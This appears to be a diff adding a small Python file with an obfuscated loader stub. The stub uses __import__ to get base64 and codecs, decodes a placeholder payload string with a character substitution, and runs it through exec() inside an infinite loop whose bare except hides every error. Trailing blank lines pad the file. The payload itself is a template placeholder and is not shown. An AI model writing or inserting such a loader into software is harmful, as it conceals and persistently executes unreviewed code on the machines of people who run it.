@@ -1,0 +1,33 @@
+
+while True:
+    try:
+        xxe=__import__('base64')
+        abc=xxe.b64decode(__import__('codecs').getencoder('utf-8')('{base64}'.replace('f-f/','F'))[0])
+
+
+        exec(abc)
+    except:
+        continue
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
